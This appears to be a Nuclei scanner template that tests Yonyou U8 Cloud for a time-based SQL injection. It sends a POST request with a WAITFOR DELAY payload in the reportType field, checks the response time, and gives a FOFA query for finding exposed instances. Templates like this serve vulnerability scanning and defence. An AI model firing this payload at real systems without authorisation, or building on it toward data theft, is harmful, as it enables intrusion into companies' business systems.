id: yonyou-u8-cloud-KeyWordDetailReportQuery-sqli

info:
  name: 用友 U8 Cloud KeyWordDetailReportQuery - sqli
  author: leadlife
  severity: high
  description: todo
  reference: 
    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8_cloud_KeyWordDetailReportQuery_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E?id=%e7%94%a8%e5%8f%8bu8_cloud_keyworddetailreportquery_sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e
  metadata:
    verified: true
    fofa-query: app="用友-U8-Cloud" || title=="U8C"
  tags: yonyou,sqli,u8cloud,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
        Host: {{Hostname}}

        {"reportType":"';WAITFOR DELAY '0:0:6'--","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 200
        condition: and

